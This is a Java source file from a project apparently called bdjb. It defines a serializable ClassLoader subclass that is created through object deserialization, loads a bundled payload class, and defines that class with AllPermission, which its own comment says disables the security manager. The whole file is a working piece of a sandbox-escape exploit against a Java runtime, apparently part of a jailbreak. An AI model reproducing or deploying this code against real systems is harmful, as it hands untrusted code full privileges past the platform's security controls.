/*
 * Copyright (C) 2021 Andy Nguyen
 *
 * This software may be modified and distributed under the terms
 * of the MIT license.  See the LICENSE file for details.
 */

package com.bdjb;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.security.AllPermission;
import java.security.Permissions;
import java.security.ProtectionDomain;

/** ClassLoader subclass that is instantiated on deserialization. */
class PayloadClassLoader extends ClassLoader implements Serializable {
  private static final long serialVersionUID = 0x4141414141414141L;

  private static final String PAYLOAD_CLASS_FILE = "/com/bdjb/Payload.class";
  private static final String PAYLOAD_CLASS_NAME = "com.bdjb.Payload";

  private static PayloadClassLoader instance;

  static PayloadClassLoader getInstance() {
    return instance;
  }

  private void readObject(ObjectInputStream stream) {
    instance = this;
  }

  void newPayload() throws Exception {
    InputStream inputStream = getClass().getResourceAsStream(PAYLOAD_CLASS_FILE);
    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();

    byte[] buf = new byte[8192];
    int read;
    while ((read = inputStream.read(buf)) > 0) {
      outputStream.write(buf, 0, read);
    }

    inputStream.close();

    byte[] payload = outputStream.toByteArray();

    // Instantiate the payload class with all permissions to disable the security manager.
    Permissions permissions = new Permissions();
    permissions.add(new AllPermission());
    ProtectionDomain protectionDomain = new ProtectionDomain(null, permissions);
    Class payloadClass =
        defineClass(PAYLOAD_CLASS_NAME, payload, 0, payload.length, protectionDomain);
    payloadClass.newInstance();
  }
}
